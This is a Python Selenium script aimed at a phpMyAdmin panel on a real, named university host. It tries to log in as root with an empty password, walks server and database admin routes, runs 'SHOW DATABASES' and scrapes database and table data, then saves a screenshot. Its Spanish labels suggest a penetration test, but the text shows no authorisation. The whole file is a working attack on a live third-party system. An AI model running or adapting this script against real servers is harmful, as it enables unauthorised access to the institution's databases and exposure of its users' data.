#!/usr/bin/env python3
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time, re, json

opts = Options()
opts.add_argument('--headless')
opts.add_argument('--no-sandbox')
opts.add_argument('--disable-dev-shm-usage')
driver = webdriver.Chrome(options=opts)

try:
    # Access phpMyAdmin
    driver.get('https://orcl.uns.edu.pe/index.php?route=/')
    time.sleep(3)
    print(f"Initial URL: {driver.current_url}")
    print(f"Initial Title: {driver.title}")
    
    # Wait for the page to load
    time.sleep(3)
    
    # Get page source
    page_source = driver.page_source
    tc = re.sub(r'<[^>]+>', ' ', page_source)
    tc = re.sub(r'\s+', ' ', tc).strip()
    print(f"\nInitial content length: {len(page_source)}")
    print(f"Initial content: {tc[:300]}")
    
    # Try to fill the login form
    print("\n=== INTENTANDO LOGIN ===\n")
    try:
        username_field = driver.find_element(By.NAME, 'pma_username')
        username_field.clear()
        username_field.send_keys('root')
        print("Username filled: root")
        
        password_field = driver.find_element(By.NAME, 'pma_password')
        password_field.clear()
        password_field.send_keys('')
        print("Password filled: empty")
        
        # Submit the form
        password_field.submit()
        time.sleep(5)
        
        print(f"\nURL after login: {driver.current_url}")
        print(f"Title after login: {driver.title}")
        
        # Get page source after login
        page_source2 = driver.page_source
        tc2 = re.sub(r'<[^>]+>', ' ', page_source2)
        tc2 = re.sub(r'\s+', ' ', tc2).strip()
        print(f"\nAfter login content length: {len(page_source2)}")
        print(f"After login content: {tc2[:500]}")
        
        # Look for database list
        if 'mysql' in tc2.lower() or 'Database' in tc2:
            print("\n[!] Database visible!")
        
        # Look for tables
        tables = re.findall(r'<td[^>]*>([^<]+)</td>', tc2)
        if tables:
            print(f"\nTables found: {tables[:20]}")
        
        # Look for database links
        db_links = driver.find_elements(By.TAG_NAME, 'a')
        for link in db_links[:30]:
            href = link.get_attribute('href')
            text = link.text
            if href and ('db' in str(href).lower() or 'mysql' in str(href).lower() or 'database' in str(text).lower()):
                print(f"  DB link: {text} -> {href}")
        
    except Exception as e:
        print(f"Form error: {e}")
    
    # Try to access different routes
    print("\n=== INTENTANDO DIFERENTES RUTAS ===\n")
    routes = [
        'https://orcl.uns.edu.pe/index.php?route=/server/databases',
        'https://orcl.uns.edu.pe/index.php?route=/server/databases/data',
        'https://orcl.uns.edu.pe/index.php?route=/server/databases/data&db=mysql',
        'https://orcl.uns.edu.pe/index.php?route=/server/databases/data&db=information_schema',
        'https://orcl.uns.edu.pe/index.php?route=/server',
        'https://orcl.uns.edu.pe/index.php?route=/server/sql',
    ]
    
    for route in routes:
        driver.get(route)
        time.sleep(3)
        tc_route = driver.page_source
        tc_route_clean = re.sub(r'<[^>]+>', ' ', tc_route)
        tc_route_clean = re.sub(r'\s+', ' ', tc_route_clean).strip()
        print(f"Route: {route.split('=')[-1]}")
        print(f"  Content length: {len(tc_route_clean)}")
        if 'mysql' in tc_route_clean.lower() or 'Database' in tc_route_clean:
            print(f"  [!] Database info found!")
        
        # Look for tables
        tables_route = re.findall(r'<td[^>]*>([^<]+)</td>', tc_route_clean)
        if tables_route:
            print(f"  Tables: {tables_route[:10]}")
        
        # Check if content is different from the JS redirect page
        if len(tc_route_clean) != 18405:
            print(f"  [!] DIFFERENT content!")
    
    # Try to execute SQL query through the browser
    print("\n=== EJECUTAR CONSULTA SQL ===\n")
    try:
        # Find the SQL query input and execute a query
        sql_input = driver.find_element(By.NAME, 'sql')
        sql_input.clear()
        sql_input.send_keys('SHOW DATABASES')
        
        # Find and click the Go button
        go_button = driver.find_element(By.XPATH, '//input[@type="submit" or @value="Go"]')
        go_button.click()
        time.sleep(5)
        
        tc_sql = driver.page_source
        tc_sql_clean = re.sub(r'<[^>]+>', ' ', tc_sql)
        tc_sql_clean = re.sub(r'\s+', ' ', tc_sql_clean).strip()
        print(f"SQL result: {tc_sql_clean[:500]}")
        
        # Look for database names
        if 'mysql' in tc_sql_clean.lower():
            print("\n[!] Database names visible!")
            db_names = re.findall(r'(?:mysql|information_schema|phpmyadmin|uns|registro)[^<,"]*', tc_sql_clean, re.IGNORECASE)
            print(f"  Databases: {db_names}")
        
    except Exception as e:
        print(f"SQL execution error: {e}")
    
    # Try to access the database structure page
    print("\n=== ESTRUCTURA DE LA BD ===\n")
    try:
        driver.get('https://orcl.uns.edu.pe/index.php?route=/server/databases/data&db=mysql')
        time.sleep(5)
        tc_db = driver.page_source
        tc_db_clean = re.sub(r'<[^>]+>', ' ', tc_db)
        tc_db_clean = re.sub(r'\s+', ' ', tc_db_clean).strip()
        print(f"MySQL DB content length: {len(tc_db_clean)}")
        
        # Look for table names
        table_names = re.findall(r'<a[^>]*>([^<]+)</a>', tc_db_clean)
        print(f"Links: {table_names[:20]}")
        
        # Look for any data
        td_data = re.findall(r'<td[^>]*>([^<]+)</td>', tc_db_clean)
        if td_data:
            print(f"Table data: {td_data[:20]}")
        
    except Exception as e:
        print(f"DB access error: {e}")
    
    # Try to find if there's any visible data
    print("\n=== DATOS VISIBLES ===\n")
    all_text = driver.find_element(By.TAG_NAME, 'body').text
    print(f"Body text length: {len(all_text)}")
    print(f"Body text: {all_text[:500]}")
    
    # Check if there are any visible elements
    visible_elements = driver.find_elements(By.CSS_SELECTOR, 'td, th, div, table')
    print(f"\nVisible elements: {len(visible_elements)}")
    for elem in visible_elements[:10]:
        text = elem.text.strip()
        if text:
            print(f"  {text[:100]}")
    
    # Try to take a screenshot
    driver.save_screenshot('C:\\Users\\Leguion T\\Desktop\\plan te pent\\prueba\\phpmysql_screenshot.png')
    print("\nScreenshot saved!")
    
finally:
    driver.quit()

print("\n=== FIN ===")
